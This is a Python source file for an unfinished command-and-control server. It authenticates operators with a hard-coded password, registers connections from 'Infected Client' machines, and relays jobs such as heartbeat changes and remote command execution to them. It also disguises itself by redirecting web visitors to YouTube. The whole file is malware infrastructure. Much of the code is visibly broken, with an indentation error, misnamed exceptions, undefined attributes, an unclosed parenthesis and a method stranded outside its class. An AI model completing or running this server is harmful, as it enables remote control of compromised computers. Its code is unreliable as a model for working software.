#!/bin/python3
import subprocess as sp
import socket
import threading
import time
import os
import random
import atexit
from datetime import datetime, timezone
import select
import logging

"""
Here's the global Debug + Logging settings. 
Global Debug print to screen will be a setting in the future
"""
global_debug = True

##Reference: https://realpython.com/python-logging/
logging.basicConfig(level=logging.DEBUG)
## Change the path to the system path + a log folder/file somewhere
logging.basicConfig(filename='../server.log', filemode='a', format='%(name)s - %(levelname)s - %(message)s', force=True)

if global_debug:
    logging.getLogger().addHandler(logging.StreamHandler())

################
## Initial Handler
################ 
class ServerSockHandler:
    """
    Description: A class that handles the inital connections, and sends them
    to the other respective classes as needed

    """

    def __init__(self):
        logging.debug(f"===== Startup | Time (UTC) {datetime.now(timezone.utc)} =====")
        self.server_password = "1234"

        ##Errors relevant to this funtion
        self.Sx01 = "conn_broken_pipe: A pipe was broken"
        self.Sx02 = "Socket Close: The socket was successfully closed"
        self.Sx03 = "Socket Timeout: The socket timed out"
        self.Sx04 = "Socket Permission Error: You most likely don'y have permissions to open a socket"
        self.Sx05 = "Connection Refused, Reset or aborted: "
        self.Sx10 = "client_unkown_input: An unkown input was receieved from the client"

        self.SxXX = "Unkown error: "

        ## Other Values
        self.http_redirect = "https://youtube.com"
    def socket_cleanup(self):
        #pass
        try:
            self.server.close()
            logging.debug(self.Sx02)


        except Exception as e:
            logging.warning(f"{self.SxXX}:{e}")

    def start_server(self, ip, port):
        """
        Description: This is the starting point for this class, it listens for connections,
        and then delegates/sorts them based on the clients response
        """

    ##== Initial Connection (these are server values, NOT client values)
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # this allows the socket to be reelased immediatly on crash/exit
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            self.ADDR = (ip,port)
            self.server.bind(self.ADDR)  
            atexit.register(self.socket_cleanup)
            self.server.listen()  

        ##Exceptions: https://docs.python.org/3/library/exceptions.html#TimeoutError
        except TimeoutError as e:
            logging.warning(f"{self.Sx03}: \n ERRMSG: {e}\n")
        except PermissionError as e:
            logging.warning(f"{self.Sx04}: \nERRMSG:{e}\n")
        except (ConnectionRefused, ErrorConnectionResetError, ConnectionAbortedError) as e:
            logging.warning(f"{self.Sx05}: \nERRMSG:{e}\n")
        except Exception as e:
            logging.warning(f"{self.SXX}:ERRMSG: {e}\n")
        

    ##== Clients & lists
        self.clients = {}
        self.current_clients = []
        
        self.friendly_current_clients = []
        self.friendly_clients = {}

    ##== Connection Loop
        while True:
            ##== Initial  handling of client 
            try:
                logging.debug(f"Server Listening: {self.ADDR}")

                self.conn, addr = self.server.accept()

                ## Getting client id from the client, and the IP address
                self.client_remote_ip_port = f"{self.conn.getpeername()[0]}:{self.conn.getpeername()[1]}"
                logging.debug(f"Accepted Connection from: {self.client_remote_ip_port}")

                ## decode THEN split
                self.response = bytes_decode(self.conn.recv(1024)).split("\\|/")
                logging.debug(f"{self.client_remote_ip_port} says: {self.response}")

            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                logging.warning(f"Client {self.client_remote_ip_port} disconnected")

            ##== parsing client response
            response_list = []
            for i in self.response:
                response_list.append(i)

            logging.debug(f"Parsed response from {self.client_remote_ip_port}: {response_list}")

            try:
                self.client_type = response_list[0]
                self.id = response_list[1]
                self.message = response_list[2]
                logging.debug(f"Client Established: {self.client_remote_ip_port} id={self.id}")

            except:
                ## Not setting self.id as it's first in the list, and SHOULD alwys have a value
                ## however an empty request may fool it
                self.message = "None"
                self.id = "None"
                logging.debug(f"No message, or ID value was recieved. response_list={response_list}")

            ## == Decisions based on parsed messages
            if self.client_type == "!_userlogin_!":
                username, password = self.message.split("//|\\\\")

                if self.password_eval(password):
                    try:
                    ##== sending the a-ok on successful authentication
                        self.conn.send(str_encode("0"))
                        friendly_client_name = f"!!~{username}"

                        logging.debug(f"Successful Logon from: {friendly_client_name}")

                        if friendly_client_name not in self.friendly_current_clients:
                            self.friendly_current_clients.append(friendly_client_name)

                        ## Addinng the class instance with the value of friendly_client_name
                        ## to the globals so it can be called upon by name
                        self.friendly_clients[friendly_client_name] = s_friendlyclient()
                        globals()[friendly_client_name] = self.friendly_clients[friendly_client_name]              

                    ## == Thread handler
                        friendly_thread = threading.Thread(
                            target=self.friendly_clients[friendly_client_name].friendly_client_communication,
                            args=(self.conn, self.ADDR, self.response, username)
                        )
                        friendly_thread.start()
                        logging.debug(f"Thread for object {friendly_client_name} created")

                    except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                        logging.warning(f"Friendly Client {friendly_client_name} disconnected")
                    except Exception as e:
                        logging.warning(f"{self.Sx-1}:{e}")
                else:
                    self.conn.send(str_encode("1"))
                    logging.critical(f"Failed logon  from {username}, {self.client_remote_ip_port}")
##====================================== Construction ===========
            elif self.client_type == "!_client_!":
                logging.debug(f"Message from Infected Client {self.id} recieved")

                ## peername[0] is ip, [1] is port
                ## Might want to rethink this as it may reach out to cleint again.
                ## or jsut create a self.ip and self.port
                client_name = "client_" + self.conn.getpeername()[0].replace(".", "_") + "_" + self.id

                if client_name not in self.current_clients:
                    self.current_clients.append(client_name)
                    ## creating object intance
                    self.client = ServerFriendlyClientHandler()
                    # adding the instance self.client to the self.clients dict
                    self.clients[client_name] = self.client
                    globals()[client_name] = self.client
                
                ## creating thread for this communication
                thread = threading.Thread(target=self.client.handle_client, args=(self.conn, self.ADDR, self.response, self.id))
                thread.start() 
##====================================== Construction ^^^^ ===========
               

            if any(method in self.client_type for method in ["GET", "HEAD", "POST", "INFO", "TRACE"]): ## sends a 403 denied via web browser/for scrapers
                ## I should capture these too and see whos hitting it
                #self.conn.send(str_encode("<p1>403 Forbidden</p1>"))
                ## Sneaky redirect to youtube 
                self.conn.send(str_encode(f'<meta http-equiv = "refresh" content = "0; url = {self.http_redirect}" />test</meta>'))
                logging.debug("Recieved HTTP Request... redirecting to webpage")
            else:
                logging.critical(f"Unexpected Connection from {self.client_remote_ip_port}. Received: {response_list} ")

################
## Friendly client
################ 
class ServerFriendlyClientHandler:
    """
    Desc:  This class is called on a per friendly client basis, and handles/stores all the data needed
    for each respective client.
    """
    def __init__(self):
        ## Init variables so error messages don't error out if called b4 they are assigned :)
        self.conn = None
        self.add = None
        self.ip = None
        self.port = None
        self.current_client_list = None

        self.Sx21 = f"[Friendly Client: {self.ip}:{self.port}] conn_broken_pipe: A pipe was broken f"

    
    def friendly_client_communication(self, conn, addr, message, username):
        """
        Note: Arguments are passed here instead of the __init__ to save a line in ServerSockHandler,
        plus it's less complicated to my head
        """
        self.conn = conn
        self.addr = addr
        self.ip = addr[0]
        self.port = addr[1]
        logging.debug(f"Friendly Client authenticated, user={username}")

        while True:
            raw_user_input = bytes_decode(self.conn.recv(1024))
            user_input = self.parse_msg_for_server(raw_user_input)         

            try:
                user_username = user_input[0]
                user_command= user_input[1]
                self.server_decision_tree(user_command)

            except:
                logging.debug(f"Error with username or command, input={raw_user_input}")

    def server_decision_tree(self, message):
        """
        Handles commands meant directly for the server
        """
        self.current_client_refresh()

        if message == "clients":
            if self.current_client_list != "":
                self.send_msg(self.current_clientlist)
                ##== these can generate a lot of  messages very quickly, leaving disabled for now
                #logging.debug(f"[] Current Clients: {self.current_client_list}")
            else:
                self.send_msg("No Current Clients")

        elif message == "stats":
            pass
            ## Need: client instance name
            ## then call: client_instance.stats
        else:
            self.client_decision_tree(message)

    def client_decision_tree(self, raw_message):
        """
        Handles commands  meant for the clients,  passed through the server
        """
        pass
    
    def current_client_refresh(self) -> None:
        """
        Checks & adds any new clients to the self.current_client_list list
        """
        self.current_client_list = ""
            for current_client in globals():
                if current_client.startswith("client_"):
                    self.current_client_list += f"{current_client}\n"


################
## Client Fucntions
################ 
"""
    ## If the job is not meant for the server, it filters down to here.
    ## this interacts with the self.clients interact function, which sets jobs 
    ## for the event loop to do on heartbeats

    ## TLDR: This sets jobs or gets current data from the current selected client

    #                           Action      Value    Target Client 
    #requests look like this: set-heartbeat 15 client_127_0_0_1_FCECW

"""
    def client_decision_tree(self, raw_message):
        message = self.parse_msg_for_client(raw_message)
        #logging.debug(f"RawMessage={raw_message}")
        #logging.debug(f"ParsedMessage{message}")

        ## No try except due to parse_msg_for_X having builtin handling
        client_command = message[0]
        client_command_value = message[1]
        ##== Client name is always last
        client_name = message[-1]


        self.client = globals()[client_name]
        if client_name in self.current_clientlist:
            pass
        else:
            logging.debug(f"[Server] Client {self.client} not found")
        
        # == Static, From Server, validated
        if client_command == "get-data":
            data = f"{self.client.data_list}"
            self.send_msg(data)  

        # == Dynamic, To Client, validated
        elif client_command == "set-heartbeat":
            heartbeat_value = client_command_value
            logging.debug(f"[Server: Username] Setting Heartbeat of {heartbeat_value} for {self.client}")
            
            self.client.interact("set-heartbeat", heartbeat_value)
            ## sanity check
            if self.client.current_job == f"set-heartbeat\\|/{heartbeat_value}":
                ## == Message back to client
                self.send_msg(f"Heartbeat queued to be set to: {heartbeat_value}"
            
            else:
                self.send_msg(f"Error setting heartbeat for {self.client}")
                logging.debug(f"Error setting heartbeat for {self.client}")   
        
               # == Dynamic, To Client
        elif client_command == "run-command":
            ## Sending back results of command run
            self.send_msg(self.client.interact("run-command", client_command_value))

    def send_msg(self, message:str):
        try:
            HEADERSIZE = 10
            message = f"{len(message):<{HEADERSIZE}}" + message
            #print(message)
            #print("---head--|msg->")
            #print(f"Message being sent back to fclient: {message}")
            encoded_response = str_encode(message)
            self.conn.send(encoded_response)

        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
            ## nuking the class on an error... could be better.
            ##Class gets respawned on next heartbeat
            exit()

    ##== Dev Note!! These need to always return SOMETHING in their lists, 
    ## that way it's  played safely and doesnt error  out
    def parse_msg_for_server(self, raw_message) -> list:
        print(f"Raw Message: {raw_message}")  if global_debug else None
        
        ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
        try:
            parsed_results_list = raw_message.replace("!_usercommand_!\\|/","").split("//|\\\\")
        except:
            parsed_results_list = ["EMPTY","EMPTY"]

        return parsed_results_list
    
    def parse_msg_for_client(self, raw_message) -> list:
        #print(f"Raw Message: {raw_message}")  if global_debug else None
        
        ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
        try:
            parsed_results_list = raw_message.split()
        except:
            parsed_results_list = ["EMPTY","EMPTY","EMPTY"]
        
        #print(f"Parsed Message: {parsed_results_list}") if global_debug else None
        return parsed_results_list


## perclient & interact left

################
## QOL Functions
################
"""
Desc: A custom encode/decoder for things, with a format try/except block built in.
Some clients send odd characters sometimes so this is a failsafe
"""

## str -> bytes
def str_encode(input, formats=["utf-8", "iso-8859-1", "windows-1252", "ascii"]) -> bytes:
    for format in formats:
        try:
            return input.encode(format)
            logging.debug(f"Succesfully encoded bytes to {format}")
        except UnicodeEncodeError:
            logging.debug(f"Could not encode bytes to {format}")
        except Exception as e:
            logging.warning(f"{self.SXX}:ERRMSG: {e}\n")


## bytes -> str
def bytes_decode(input, formats=["utf-8", "iso-8859-1", "windows-1252", "ascii"]) -> str:
    for format in formats:
        try:
            return input.decode(format)
            logging.debug(f"Succesfully decoded bytes to {format}")
        except UnicodeEncodeError:
            logging.debug(f"Could not decode bytes to {format}")
        except Exception as e:
            logging.warning(f"{self.SXX}:ERRMSG: {e}\n")



s = ServerSockHandler()
s.start_server("127.0.0.1",80)
logging.debug("ServerSockHandler Called")
